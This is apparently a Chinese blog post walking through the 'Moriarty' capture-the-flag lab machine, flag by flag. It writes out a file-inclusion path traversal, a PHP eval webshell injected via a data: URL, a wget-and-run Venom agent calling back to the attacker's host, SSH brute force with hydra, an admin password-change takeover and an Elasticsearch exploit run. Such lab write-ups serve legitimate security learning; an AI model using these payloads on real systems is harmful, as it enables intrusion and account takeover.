


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">
  <title>Moriarty靶机 [ Hexo ]</title>
  <!-- bootstrapcss文件 -->
 <!--  <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"> -->
<!--   
<link rel="stylesheet" href="/css/zhl.css">

 -->
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="/css/fork-awesome.min.css">
    
      <link rel="stylesheet" href="/css/zhl.css">
    
  
  
<meta name="generator" content="Hexo 6.3.0"></head>
<body>
<div class="container-fluid">
  <div class="row">
  <div id="wrap" class="col-md-12">
    <div id="header">
	<div id="header-left">
	<h1 id="header-title"> 
	<a href="/">
		Hexo
	</a>
	</h1>
	
	</div>
	<div id="header-right">
		
		
		<a href="/"  title="home"><i class="fa fa-home ">home</i></a>
		
		<a target="_blank" rel="noopener" href="https://github.com/moyan222/moyan222.github.io"  title="demo"><i class="fa fa-code ">demo</i></a>
		
		<a href="/about"  title="about"><i class="fa fa-user ">about</i></a>
		
		<a href="/"  title="music"><i class="fa fa-music ">music</i></a>
		
		
	</div>
</div>

  </div>
  </div>
  <div id="content" class="row">
    <div id="content-left" class="col-md-4">
      

	

	
	<div class="widget-wrap">
		<h3 class="widget-title fa fa-tags">标签</h3>
		<div class="widget tags">
		<a class="tag-span-link" href="/tags/ACL/" rel="tag">ACL<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/ARP%E6%8A%93%E5%8C%85/" rel="tag">ARP抓包<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/HTML/" rel="tag">HTML<span class="tag-span-count">6</span></a> <a class="tag-span-link" href="/tags/JS/" rel="tag">JS<span class="tag-span-count">5</span></a> <a class="tag-span-link" href="/tags/PHP/" rel="tag">PHP<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入<span class="tag-span-count">8</span></a> <a class="tag-span-link" href="/tags/STP/" rel="tag">STP<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/VLAN/" rel="tag">VLAN<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/http%E8%AF%B7%E6%B1%82-%E7%81%AB%E7%8B%90%E4%BB%A3%E7%90%86%E5%AE%89%E8%A3%85/" rel="tag">http请求+火狐代理安装<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/markdown%E8%AF%AD%E6%B3%95/" rel="tag">markdown语法<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集<span class="tag-span-count">8</span></a> <a class="tag-span-link" href="/tags/%E5%85%B3%E4%BA%8E%E4%B8%BB%E9%A2%98/" rel="tag">关于主题<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0/" rel="tag">分享笔记<span class="tag-span-count">4</span></a> <a class="tag-span-link" href="/tags/%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/" rel="tag">博客的搭建<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%9B%BE%E5%BA%8A%E7%9A%84%E6%90%AD%E5%BB%BA/" rel="tag">图床的搭建<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库<span class="tag-span-count">3</span></a> <a class="tag-span-link" href="/tags/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" rel="tag">数据通信网络基础<span class="tag-span-count">6</span></a> <a class="tag-span-link" href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" rel="tag">永恒之蓝<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E7%AB%AF%E5%8F%A3/" rel="tag">端口<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" rel="tag">计算机基础<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/" rel="tag">链路聚合<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/" rel="tag">静态路由<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/" rel="tag">靶机笔记<span class="tag-span-count">3</span></a>
		</div>
	</div>


	
	<div class="widget-wrap">
		<h3 class="widget-title fa fa-archive">归档</h3>
		<div class="widget">
			<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">64</span></li></ul>
		</div>
	</div>



    </div>
    <div id="content-right" class="col-md-8">
    
<article id="post">
	<div class="post-title">
  <h1>Moriarty靶机</h1>
  	</div>
  <div class="page-meta">
  	<span class="fa-wrap">
  		<i class="fa fa-clock-o"></i>
  		<span class="date-meta">2023-09-21</span>
  	</span>
  	<span class="fa-wrap">
  		
  		<i class="fa fa-tags"></i>
  		<span class="tags-meta">靶机笔记</span>
  		
  	</span>
  	<span class="fa-wrap">
  		
  	</span>
  </div>
  <div class="post-content">
  <h1 id="Moriaty靶机步骤"><a href="#Moriaty靶机步骤" class="headerlink" title="Moriaty靶机步骤"></a>Moriaty靶机步骤</h1><h2 id="1-扫描本地局域网查找靶机IP"><a href="#1-扫描本地局域网查找靶机IP" class="headerlink" title="1.扫描本地局域网查找靶机IP"></a>1.扫描本地局域网查找靶机IP</h2><p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212156149.png" alt="image-20230921215600159">                               </p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212156763.png" alt="image-20230921215617408"></p>
<h2 id="2-扫描端口"><a href="#2-扫描端口" class="headerlink" title="2.扫描端口"></a>2.扫描端口</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212156614.png" alt="image-20230921215627470"></p>
<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><h2 id="访问8000端口"><a href="#访问8000端口" class="headerlink" title="访问8000端口"></a>访问8000端口</h2><p>发现第一个flag,复制flag{start}输入即可</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212156506.png" alt="image-20230921215637440"></p>
<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><h2 id="1-根据提示：目标靶机开放在80端口"><a href="#1-根据提示：目标靶机开放在80端口" class="headerlink" title="1.  根据提示：目标靶机开放在80端口"></a>1.  根据提示：目标靶机开放在80端口</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212156704.png" alt="image-20230921215654692"></p>
<p>扫描80端口</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212157082.png" alt="image-20230921215705063"></p>
<h2 id="2-访问80端口"><a href="#2-访问80端口" class="headerlink" title="2.访问80端口"></a>2.访问80端口</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212157036.png" alt="image-20230921215711452"></p>
<h2 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3.文件包含"></a>3.文件包含</h2><p>看到?file&#x3D;page1.html马上想到文件包含</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212157142.png" alt="image-20230921215723099"></p>
<p>利用?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd确认存在文件包含</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212158378.png" alt="image-20230921215736718"></p>
<p>\1.  方法1：执行一句话木马用蚁剑连接</p>
<p>使用<strong>代码执行</strong>**(****实用)**命令data:text&#x2F;plain,<?php phpinfo();?> &#x2F;&#x2F;显示phpinfo文件</p>
<p>还可以使用<strong>代码执行</strong>命令执行一句话木马?file&#x3D;data:text&#x2F;plain,<?php @eval($_POST['pw']); ?>然后用蚁剑连接</p>
<p><strong>URL****整条直接复制</strong></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212158078.png" alt="image-20230921215845829"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212158323.png" alt="image-20230921215854195"></p>
<p>进入之后在根目录下找到flag</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212159925.png" alt="image-20230921215902754"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212159112.png" alt="image-20230921215910147"></p>
<p>复制flag回到8000端口填写即可</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212159823.png" alt="image-20230921215921750"></p>
<p>进入下一关</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212159950.png" alt="image-20230921215929863"></p>
<p>根据提示，目标靶机在内网172.17.0.3-254上</p>
<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p>\2.  利用Venom让靶机上线</p>
<p>使用Venom建立通信隧道</p>
<p>启动Venom服务端，开启监听</p>
<p><strong>chmod +x agent_linux_x64</strong></p>
<p><strong>.&#x2F;admin_linux_x64 -lport 9999</strong></p>
<p><strong>开启python服务python -m http.server 80</strong></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212159241.png" alt="image-20230921215944307"></p>
<p>cd &#x2F;tmp 在靶机上进入临时目录tmp</p>
<p>wget <a target="_blank" rel="noopener" href="http://192.168.56.102/agent_linux_x64">http://192.168.56.102/agent_linux_x64</a> 在靶机上下载木马agent_linux_x64准备上线</p>
<p>chmod +x agent_linux_x64 先给木马执行权限</p>
<p>.&#x2F;agent_linux_x64 -rhost 192.168.56.102 -rport 9999  &#x2F;&#x2F;运行木马上线</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212159122.png" alt="image-20230921215952799"></p>
<p><strong>Venom****服务端可以看到有节点上线，开启Kali本地socks侦听端口1080</strong></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212200321.png" alt="image-20230921220005088"></p>
<p>show</p>
<p>goto 1</p>
<p>socks 1080</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212200306.png" alt="image-20230921220014241"></p>
<p>\3.  Kali挂Proxychains扫描内网</p>
<p>vi &#x2F;etc&#x2F;proxychains4.conf 修改Proxychains配置文件</p>
<p>修改最后一行配置文件为：</p>
<p>socks5 127.0.0.1 1080</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212200546.png" alt="image-20230921220025673"></p>
<p>\4.  扫描内外目标IP地址</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212200002.png" alt="image-20230921220039943"></p>
<p><strong>浏览器配置代理访问172.17.0.4的页面(这里在物理机上抓包)</strong></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212200129.png" alt="image-20230921220047191"></p>
<p>开启http拦截，选择上传shell文件，随便输入上传密码，点击上传</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212201520.png" alt="image-20230921220059549"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212201351.png" alt="image-20230921220106339"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212201955.png" alt="image-20230921220114471"></p>
<p>密码为password</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212201044.png" alt="image-20230921220125145"></p>
<p>\5.  输入正确的密码password登录</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212201342.png" alt="image-20230921220132424"></p>
<p>将蚁剑设置代理</p>
<p>socks5 192.168.56.102 1080</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212201819.png" alt="image-20230921220143943"></p>
<p>复制shell.php地址连接蚁剑成功</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212201024.png" alt="image-20230921220154981"></p>
<p>在根目录下找到2_flag.txt</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212202312.png" alt="image-20230921220202181"></p>
<p>复制flag{picture_is_worth_1000_words}填入进入即可</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212202929.png" alt="image-20230921220208776"></p>
<h1 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h1><p>\6.  挂代理扫描内网开启22端口的主机</p>
<p>proxychains nmap -p22 -sT –Pn 172.17.0.4-254</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212202879.png" alt="image-20230921220216559"></p>
<p>\7.  写入用户名到user.txt准备爆破</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212202184.png" alt="image-20230921220226156"></p>
<p><strong>vi user.txt</strong></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212202433.png" alt="image-20230921220233527"></p>
<p>\8.  将密码采用在线MD5解密并将明文写入pass.txt</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212202912.png" alt="image-20230921220241833"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212202758.png" alt="image-20230921220248717"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212202703.png" alt="image-20230921220254764"></p>
<p>\9.  使用hydra暴力破解ssh</p>
<p>经过爆破得知用户名为root对应密码为weapons</p>
<p>proxychains hydra -L user.txt -P pass.txt ssh:&#x2F;&#x2F;172.17.0.5 -t 4</p>
<p>-t：设置并发数</p>
<p>不能太高</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212203880.png" alt="image-20230921220320802"></p>
<p>\10. 使用ssh登录目标靶机</p>
<p>proxychains ssh <a href="mailto:root@172.17.0.5">root@172.17.0.5</a></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212203477.png" alt="image-20230921220331402"></p>
<p>进入根目录cd &#x2F;</p>
<p>ls查看根目录下的内容，发现flag</p>
<p>cat 3_flag.txt的内容为</p>
<p>flag{what_weapons}</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212203067.png" alt="image-20230921220341057"></p>
<p>提交flag进入下一关</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212203643.png" alt="image-20230921220349675"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212203226.png" alt="image-20230921220355940"></p>
<h1 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h1><p>根据提示：目标靶机可能在443,8000,8080,8888.端口上，目标账号密码是buyer13:arms13</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212204562.png" alt="image-20230921220402653"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212204392.png" alt="image-20230921220408441"></p>
<p>经扫描得知，目标主机为172.17.0.8:8000 http服务</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212204435.png" alt="image-20230921220414505"></p>
<p>访问目标主机:172.17.0.8:8000并输入用户名buyer13和密码arms13</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212204707.png" alt="image-20230921220421788"></p>
<p>尝试点击Chats,可以发现管理员用户为admin</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212204006.png" alt="image-20230921220431448"></p>
<p>进入修改密码界面进行抓包()</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212204914.png" alt="image-20230921220441026"></p>
<p>将用户名修改为admin后放包</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212204584.png" alt="image-20230921220447351"></p>
<p>放包后新建一个隐私页面或者更换没有登录过该网页的浏览器</p>
<p>用admin登录后点击chats即可看到flag</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212204315.png" alt="image-20230921220455489"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212205047.png" alt="image-20230921220502095"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212205257.png" alt="image-20230921220512301"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212205735.png" alt="image-20230921220518527"></p>
<h1 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h1><p>\1.  扫描172.17.0.3-254，指定端口为9200</p>
<p>根据信息：内网存在Elasticsearch服务（工作在TCP9200端口）</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212205043.png" alt="image-20230921220528084"></p>
<p>扫描发现目标主机为172.17.0.10:9200</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212205701.png" alt="image-20230921220533825"></p>
<p>访问172.17.0.10:9200</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212205507.png" alt="image-20230921220548816"></p>
<p>\2. 老Elasticsearch软件版本存在很多漏洞，搜索可利用攻击脚本</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212205837.png" alt="image-20230921220555753"></p>
<p>先查看36337.py脚本可以发现目标靶机是使用python2作为解析器</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212206411.png" alt="image-20230921220604437"></p>
<p><strong>为了能让36337.py脚本能正常执行，先要写入一条数据</strong></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212206908.png" alt="image-20230921220612093"></p>
<p>proxychains python2 36337.py 172.17.0.10  &#x2F;&#x2F;执行攻击脚本</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212206942.png" alt="image-20230921220618840"></p>
<p>ls查看得到flag</p>
<p>cat查看flag内容后复制填入过关即可</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212206429.png" alt="image-20230921220626584"></p>
<p>cat 6_flag.txt</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212206552.png" alt="image-20230921220633440"></p>
<p>结束</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212206592.png" alt="image-20230921220652594"></p>

	</div>
</article>



    </div>
  </div>
  <div class="row">
<div id="bottom" class="col-md-12"> 
  <div class="bottom-nav">
	
	
	<a href="https://github.com/lizehongss" class="fa fa-github fa-2x" target="_blank" title="Follow me" ></a>
	
	
</div>
<div class="bottom-info">
	&copy; 2023 John Doe<br>
	Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
	theme <a href="https://github.com/lizehongss/hexo-theme-zhl" target="_blank">zhl</a>
</div>
</div>
</div>
</div>
<div id="tool">
  <ul>
    <li class="fa fa-angle-up top" id="top"></li>
  </ul>
</div>
  <div class="bg_content">
    <canvas id="canvas"></canvas>
  </div>
  
  <!-- scripts list from theme config.yml -->
  
    <script src="/js/zhl.js"></script>
  
    <script src="/js/bj.js"></script>
  

<!-- jQ cdn  -->
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<!-- bootstrap js cdn-->
<!-- <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script> -->


</body>
</html>
